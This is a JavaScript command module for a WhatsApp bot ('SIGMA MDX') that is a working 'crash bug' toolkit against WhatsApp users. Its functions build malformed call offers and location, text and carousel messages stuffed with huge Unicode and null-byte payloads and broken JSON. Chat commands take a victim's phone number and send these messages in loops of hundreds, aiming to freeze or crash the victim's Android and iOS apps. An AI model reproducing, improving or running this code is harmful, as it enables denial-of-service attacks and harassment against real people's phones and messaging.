import { generateWAMessageFromContent, proto, encodeSignedDeviceIdentity } from "@whiskeysockets/baileys";
import crypto from "crypto";

// Helper function pour décoder les JIDs
const jidDecode = (jid) => {
  if (!jid || typeof jid !== 'string') return null;
  const parts = jid.replace(/@.*$/, '').split(':');
  return {
    user: parts[0],
    device: parts[1] ? parseInt(parts[1]) : 0
  };
};

// Helper function pour encoder les messages
const encodeWAMessage = (msg) => {
  try {
    // Convertir le message en binaire
    if (msg instanceof Uint8Array) return msg;
    if (typeof msg === 'string') return Buffer.from(msg, 'utf8');
    if (msg && msg.constructor === Object) {
      return Buffer.from(JSON.stringify(msg), 'utf8');
    }
    return Buffer.from(String(msg), 'utf8');
  } catch (e) {
    console.error('encodeWAMessage error:', e);
    return Buffer.alloc(0);
  }
};

// ===================== HELPERS =====================
export const sleep = ms => new Promise(r => setTimeout(r, ms));

// ===================== TSW BUG FUNCTIONS =====================

// === AUTOSYNC - Travas Android ===
async function autosync(sock, X) {
    try {
        let devices = (
            await sock.getUSyncDevices([X], false, false)
        ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

        await sock.assertSessions(devices);

        let createMutex = () => {
            let map = {};
            return {
                mutex(key, fn) {
                    map[key] ??= { task: Promise.resolve() };
                    map[key].task = (async prev => {
                        try { await prev; } catch {}
                        return fn();
                    })(map[key].task);
                    return map[key].task;
                }
            };
        };

        let mutexManager = createMutex();
        let mergeBuffer = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
        let originalCreateParticipantNodes = sock.createParticipantNodes.bind(sock);
        let encodeMsg = sock.encodeWAMessage?.bind(sock);

        sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
            if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

            let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
            let mapped = Array.isArray(patched)
                ? patched
                : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

            let { id: meId, lid: meLid } = sock.authState.creds.me;
            let decodedLidUser = meLid ? jidDecode(meLid)?.user : null;
            let shouldIncludeDeviceIdentity = false;

            let nodes = await Promise.all(mapped.map(async ({ recipientJid: jid, message: msg }) => {
                let { user: targetUser } = jidDecode(jid);
                let { user: ownPnUser } = jidDecode(meId);
                let isOwnUser = targetUser === ownPnUser || targetUser === decodedLidUser;
                let isSelf = jid === meId || jid === meLid;

                if (dsmMessage && isOwnUser && !isSelf) msg = dsmMessage;

                let bytes = mergeBuffer(encodeMsg ? encodeMsg(msg) : encodeWAMessage(msg));

                return mutexManager.mutex(jid, async () => {
                    let { type, ciphertext } = await sock.signalRepository.encryptMessage({ jid, data: bytes });
                    if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
                    return {
                        tag: 'to',
                        attrs: { jid },
                        content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
                    };
                });
            }));

            return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
        };

        let { nodes: destinations, shouldIncludeDeviceIdentity } =
            await sock.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });

        let callNode = {
            tag: "call",
            attrs: { to: X, id: sock.generateMessageTag(), from: sock.user.id },
            content: [{
                tag: "offer",
                attrs: {
                    "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
                    "call-creator": sock.user.id
                },
                content: [
                    { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                    { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                    {
                        tag: "video",
                        attrs: {
                            orientation: "0",
                            screen_width: "1920",
                            screen_height: "1080",
                            device_orientation: "0",
                            enc: "vp8",
                            dec: "vp8"
                        }
                    },
                    { tag: "net", attrs: { medium: "3" } },
                    { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
                    { tag: "encopt", attrs: { keygen: "2" } },
                    { tag: "destination", attrs: {}, content: destinations },
                    ...(shouldIncludeDeviceIdentity
                        ? [{
                            tag: "device-identity",
                            attrs: {},
                            content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
                        }]
                        : [])
                ]
            }]
        };

        await sock.sendNode(callNode);
        await sock.sendNode(callNode);
        
    } catch (err) {
        console.error("[AUTOSYNC ERROR]", err);
    }
}

// === GHOST IOS - InVsSwIphone ===
async function InVsSwIphone(sock, X, ptcp = true) {
    try {
        const locationMessage = {
            degreesLatitude: -9.09999262999,
            degreesLongitude: 199.99963118999,
            jpegThumbnail: null,
            name: "SIGMA MDX" + "𑇂𑆵𑆴𑆿".repeat(15000),
            address: "SIGMA MDX" + "𑇂𑆵𑆴𑆿".repeat(5000),
            url: `https://sigma.mdx.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
        };

        const msg = generateWAMessageFromContent(
            X,
            { viewOnceMessage: { message: { locationMessage } } },
            {}
        );

        await sock.relayMessage(
            X,
            { groupStatusMessageV2: { message: msg.message } },
            ptcp
                ? { messageId: msg.key.id, participant: { jid: X } }
                : { messageId: msg.key.id }
        );
    } catch (err) {
        console.error("[GHOST IOS ERROR]", err);
    }
}

// === PENDING MSG - InVisDelayLoc ===
async function InVisDelayLoc(sock, X, ptcp = true) {
    for (let i = 0; i < 75; i++) {
        let msg = generateWAMessageFromContent(X, {
            interactiveResponseMessage: {
                contextInfo: {
                    mentionedJid: Array.from({ length: 2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`)
                },
                body: {
                    text: "𖣂᳟༑ᜌ ̬     ͠⤻𝐒𝐈𝐆𝐌𝐀 ( 𖣂 ) 𝐌𝐃𝐗  ⃜    ᭨᳟᪳",
                    format: "DEFAULT"
                },
                nativeFlowResponseMessage: {
                    name: "galaxy_message",
                    paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
                    version: 3
                }
            }
        }, {});

        await sock.relayMessage(X, {
            groupStatusMessageV2: {
                message: msg.message
            }
        }, ptcp ? { messageId: msg.key.id, participant: { jid: X } } : { messageId: msg.key.id });
    }
}

// === CAROUSEL PARAMS ===
async function CorosuelParams(sock, target) {
    for (let i = 0; i < 75; i++) {
        const cards = Array.from({ length: 5 }, () => ({
            body: proto.Message.InteractiveMessage.Body.fromObject({ text: "⭑🎭̤𝐒𝐈𝐆𝐌𝐀 𝐌𝐃𝐗 ☇" + "ꦾ".repeat(5000) }),
            footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "⭑̤ ⃟༑ SIGMA MDX" + "ꦾ".repeat(5000) }),
            header: proto.Message.InteractiveMessage.Header.fromObject({
                title: "⭑̤ ⃟༑ SIGMA MDX" + "ꦾ".repeat(5000),
                hasMediaAttachment: true,
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/533825502_1245309493950828_6330642868394879586_n.enc",
                    mimetype: "video/mp4",
                    fileSha256: "IL4IFl67c8JnsS1g6M7NqU3ZSzwLBB3838ABvJe4KwM=",
                    fileLength: "9999999999999999",
                    seconds: 9999,
                    mediaKey: "SAlpFAh5sHSHzQmgMGAxHcWJCfZPknhEobkQcYYPwvo=",
                    height: 9999,
                    width: 9999,
                    fileEncSha256: "QxhyjqRGrvLDGhJi2yj69x5AnKXXjeQTY3iH2ZoXFqU=",
                    directPath: "/v/t62.7161-24/533825502_1245309493950828_6330642868394879586_n.enc",
                    mediaKeyTimestamp: "1755691703",
                },
            }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                messageParamsJson: "{[",
                messageVersion: 3,
                buttons: [
                    { name: "single_select", buttonParamsJson: "" },
                    { name: "galaxy_message", buttonParamsJson: JSON.stringify({ "icon": "RIVIEW", "flow_cta": "ꦾ".repeat(10000), "flow_message_version": "3" }) },
                    { name: "galaxy_message", buttonParamsJson: JSON.stringify({ "icon": "RIVIEW", "flow_cta": "ꦽ".repeat(10000), "flow_message_version": "3" }) }
                ]
            })
        }));

        const carousel = generateWAMessageFromContent(
            target,
            {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
                        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                            body: proto.Message.InteractiveMessage.Body.create({ text: `⭑̤ ⃟༑𝐒𝐈𝐆𝐌𝐀 𝐌𝐃𝐗  ⃟༑\n${"ꦽ".repeat(2000)}:)\n\u0000` + "ꦽ".repeat(5000) }),
                            footer: proto.Message.InteractiveMessage.Footer.create({ text: "ꦾ".repeat(5000) }),
                            header: proto.Message.InteractiveMessage.Header.create({ hasMediaAttachment: false }),
                            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ cards: cards }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                messageParamsJson: "{[".repeat(10000),
                                messageVersion: 3,
                                buttons: [
                                    { name: "single_select", buttonParamsJson: "" },
                                    { name: "galaxy_message", buttonParamsJson: JSON.stringify({ "icon": "RIVIEW", "flow_cta": "ꦾ".repeat(10000), "flow_message_version": "3" }) },
                                    { name: "galaxy_message", buttonParamsJson: JSON.stringify({ "icon": "RIVIEW", "flow_cta": "ꦽ".repeat(10000), "flow_message_version": "3" }) }
                                ]
                            }),
                            contextInfo: {
                                participant: target,
                                mentionedJid: [
                                    "0@s.whatsapp.net",
                                    ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"),
                                ],
                                remoteJid: "X",
                                participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                                stanzaId: "123",
                                quotedMessage: {
                                    paymentInviteMessage: { serviceType: 3, expiryTimestamp: Date.now() + 1814400000 },
                                    forwardedAiBotMessageInfo: { botName: "META AI", botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net", creatorName: "Bot" }
                                }
                            },
                        })
                    }
                }
            },
            { userJid: target }
        );

        await sock.relayMessage(target, {
            groupStatusMessageV2: { message: carousel.message }
        }, { messageId: carousel.key.id });
    }
}

// === EXTEND IOS ===
async function iNvsExTendIos(sock, X, ptcp = true) {
    const extendedTextMessage = {
        text: "𝐒𝐈𝐆𝐌𝐀 𝐌𝐃𝐗 \n\n 🫀 by MUZAN SIGMA" + "𑇂𑆵𑆴𑆿".repeat(15000),
        matchedText: "https://t.me/sigmamdx",
        description: "SIGMA MDX" + "𑇂𑆵𑆴𑆿".repeat(15000),
        title: "𝐒𝐈𝐆𝐌𝐀 ᭯ 𝐌𝐃𝐗 ☇" + "𑇂𑆵𑆴𑆿".repeat(15000),
        previewType: "NONE",
        jpegThumbnail: null,
        placeholderKey: { remoteJid: "0@s.whatsapp.net", fromMe: false, id: "ABCDEF1234567890" }
    };

    const msg = generateWAMessageFromContent(
        X,
        { viewOnceMessage: { message: { extendedTextMessage } } },
        {}
    );

    await sock.relayMessage(X, {
        groupStatusMessageV2: { message: msg.message }
    }, ptcp ? { messageId: msg.key.id, participant: { jid: X } } : { messageId: msg.key.id });
}

// ===================== COMMANDS =====================

const bugmenu = {
    name: "bugmenu",
    description: "Affiche toutes les commandes de bugs",
    category: "bug",
    execute: async (sock, msg, args, from) => {
        const totalSeconds = process.uptime();
        const hours = Math.floor(totalSeconds / 3600);
        const minutes = Math.floor((totalSeconds % 3600) / 60);
        const seconds = Math.floor(totalSeconds % 60);
        const uptime = `${hours}h ${minutes}m ${seconds}s`;

        const menuText = `> ╔════════════════════════╗
>      💢 𝐒𝐈𝐆𝐌𝐀 𝐌𝐃𝐗 - 𝐁𝐔𝐆 💢
> ╚════════════════════════╝

> 🥷🏾 *Utilisateur* : ${msg.pushName || "Invité"}
> ⏱️ *Uptime*      : ${uptime}
> 📱 *Version*     : 3.0
> 🧎🏾 *Dev*         : _MUZAN SIGMA_

> ╔───── ☠️ BUG MENU ☠️ ─────╗
> ┃ ➤ travas (numéro)
> ┃ ➤ pending (numéro)
> ┃ ➤ ghost (numéro)
> ┃ ➤ brutal (numéro)
> ┃ ➤ extend (numéro)
> ╚──────────────────────────╝

> 💢 *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴍᴜᴢᴀɴ sɪɢᴍᴀ* 💢`;

        // Toujours envoyer le menu en texte pour éviter les erreurs de connexion (ETIMEDOUT)
        await sock.sendMessage(from, { text: menuText }, { quoted: msg });

        // Médias optionnels : en cas de timeout, l'utilisateur a déjà le menu
        try {
            await sock.sendMessage(from, {
                image: { url: "https://files.catbox.moe/6uizvk.jpg" },
                caption: menuText,
                gifPlayback: false,
            }, { quoted: msg });
        } catch (e) {
            console.warn("[bugmenu] Image non envoyée (timeout/connexion):", e?.message || e);
        }
        try {
            await sock.sendMessage(from, {
                audio: { url: "https://files.catbox.moe/59g6u8.mp3" },
                mimetype: "audio/mpeg",
                ptt: true,
            }, { quoted: msg });
        } catch (e) {
            console.warn("[bugmenu] Audio non envoyé (timeout/connexion):", e?.message || e);
        }
    },
};

// === TRAVAS - Android Bug ===
const travas = {
    name: "travas",
    execute: async (sock, msg, args, from) => {
        const q = args[0];
        if (!q) {
            return sock.sendMessage(from, { text: `📌 Exemple : travas 237xxxxxxxx` }, { quoted: msg });
        }

        let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        const bare = q.replace(/[^0-9]/g, "");

        try {
            try {
                await sock.sendMessage(from, {
                    image: { url: "https://files.catbox.moe/6uizvk.jpg" },
                    caption: `☠️ *TRAVAS ANDROID*\n\n🎯 Cible : wa.me/${bare}\n\n💢 *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴍᴜᴢᴀɴ sɪɢᴍᴀ*`
                }, { quoted: msg });
            } catch (e) {
                try { await sock.sendMessage(from, { text: `☠️ *TRAVAS ANDROID*\n\n🎯 Cible : wa.me/${bare}\n\n💢 *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴍᴜᴢᴀɴ sɪɢᴍᴀ*` }, { quoted: msg }); } catch (_) {}
            }
        } catch (_) {}

        await sleep(2000);

        for (let i = 0; i < 200; i++) {
            try {
                await autosync(sock, target);
                await autosync(sock, target);
            } catch (err) { console.error("❌ Erreur travas itération:", err?.message || err); }
            await new Promise(resolve => setImmediate(resolve));
        }
        try { await sock.sendMessage(from, { react: { text: "💀", key: msg.key } }); } catch (_) {}
    }
};

// === PENDING - Pending Message Bug ===
const pending = {
    name: "pending",
    execute: async (sock, msg, args, from) => {
        const q = args[0];
        if (!q) {
            return sock.sendMessage(from, { text: `📌 Exemple : pending 237xxxxxxxx` }, { quoted: msg });
        }

        let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        const bare = q.replace(/[^0-9]/g, "");

        try {
            try {
                await sock.sendMessage(from, {
                    image: { url: "https://files.catbox.moe/m34aop.jpg" },
                    caption: `⏳ *PENDING MSG*\n\n🎯 Cible : wa.me/${bare}\n\n💢 *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴍᴜᴢᴀɴ sɪɢᴍᴀ*`
                }, { quoted: msg });
            } catch (e) {
                try { await sock.sendMessage(from, { text: `⏳ *PENDING MSG*\n\n🎯 Cible : wa.me/${bare}\n\n💢 *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴍᴜᴢᴀɴ sɪɢᴍᴀ*` }, { quoted: msg }); } catch (_) {}
            }
        } catch (_) {}

        await sleep(2000);

        for (let z = 0; z < 200; z++) {
            try { await InVisDelayLoc(sock, target); } catch (err) { console.error("❌ Erreur pending itération:", err?.message || err); }
            await new Promise(r => setImmediate(r));
        }
        try { await sock.sendMessage(from, { react: { text: "⏳", key: msg.key } }); } catch (_) {}
    }
};

// === GHOST - iOS Ghost Bug ===
const ghost = {
    name: "ghost",
    execute: async (sock, msg, args, from) => {
        const q = args[0];
        if (!q) {
            return sock.sendMessage(from, { text: `📌 Exemple : ghost 237xxxxxxxx` }, { quoted: msg });
        }

        let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        const bare = q.replace(/[^0-9]/g, "");

        try {
            try {
                await sock.sendMessage(from, {
                    image: { url: "https://files.catbox.moe/jwbrkr.jpg" },
                    caption: `👻 *GHOST IOS*\n\n🎯 Cible : wa.me/${bare}\n\n💢 *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴍᴜᴢᴀɴ sɪɢᴍᴀ*`
                }, { quoted: msg });
            } catch (e) {
                try { await sock.sendMessage(from, { text: `👻 *GHOST IOS*\n\n🎯 Cible : wa.me/${bare}\n\n💢 *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴍᴜᴢᴀɴ sɪɢᴍᴀ*` }, { quoted: msg }); } catch (_) {}
            }
        } catch (_) {}

        await sleep(2000);

        for (let z = 0; z < 200; z++) {
            try { await InVsSwIphone(sock, target); } catch (err) { console.error("❌ Erreur ghost itération:", err?.message || err); }
            await new Promise(r => setImmediate(r));
        }
        try { await sock.sendMessage(from, { react: { text: "👻", key: msg.key } }); } catch (_) {}
    }
};

// === BRUTAL - Combined Bug ===
const brutal = {
    name: "brutal",
    execute: async (sock, msg, args, from) => {
        const q = args[0];
        if (!q) {
            return sock.sendMessage(from, { text: `📌 Exemple : brutal 237xxxxxxxx` }, { quoted: msg });
        }

        let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        const bare = q.replace(/[^0-9]/g, "");

        try {
            try {
                await sock.sendMessage(from, {
                    image: { url: "https://files.catbox.moe/y7c9p5.jpg" },
                    caption: `💀 *BRUTAL MODE*\n\n🎯 Cible : wa.me/${bare}\n\n💢 *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴍᴜᴢᴀɴ sɪɢᴍᴀ*`
                }, { quoted: msg });
            } catch (e) {
                try { await sock.sendMessage(from, { text: `💀 *BRUTAL MODE*\n\n🎯 Cible : wa.me/${bare}\n\n💢 *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴍᴜᴢᴀɴ sɪɢᴍᴀ*` }, { quoted: msg }); } catch (_) {}
            }
        } catch (_) {}

        await sleep(2000);

        for (let z = 0; z < 200; z++) {
            try {
                await autosync(sock, target);
                await InVisDelayLoc(sock, target);
                await InVsSwIphone(sock, target);
            } catch (err) { console.error("❌ Erreur brutal itération:", err?.message || err); }
            await new Promise(r => setImmediate(r));
        }
        try { await sock.sendMessage(from, { react: { text: "☠️", key: msg.key } }); } catch (_) {}
    }
};

// === EXTEND - Extended Text Bug ===
const extend = {
    name: "extend",
    execute: async (sock, msg, args, from) => {
        const q = args[0];
        if (!q) {
            return sock.sendMessage(from, { text: `📌 Exemple : extend 237xxxxxxxx` }, { quoted: msg });
        }

        let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        const bare = q.replace(/[^0-9]/g, "");

        try {
            try {
                await sock.sendMessage(from, {
                    image: { url: "https://files.catbox.moe/a33171.jpg" },
                    caption: `📱 *EXTEND IOS*\n\n🎯 Cible : wa.me/${bare}\n\n💢 *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴍᴜᴢᴀɴ sɪɢᴍᴀ*`
                }, { quoted: msg });
            } catch (e) {
                try { await sock.sendMessage(from, { text: `📱 *EXTEND IOS*\n\n🎯 Cible : wa.me/${bare}\n\n💢 *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴍᴜᴢᴀɴ sɪɢᴍᴀ*` }, { quoted: msg }); } catch (_) {}
            }
        } catch (_) {}

        await sleep(2000);

        for (let z = 0; z < 200; z++) {
            try {
                await iNvsExTendIos(sock, target);
                await CorosuelParams(sock, target);
            } catch (err) { console.error("❌ Erreur extend itération:", err?.message || err); }
            await new Promise(r => setImmediate(r));
        }
        try { await sock.sendMessage(from, { react: { text: "📱", key: msg.key } }); } catch (_) {}
    }
};

// ===================== EXPORT =====================
export default [
    bugmenu,
    travas,
    pending,
    ghost,
    brutal,
    extend
];
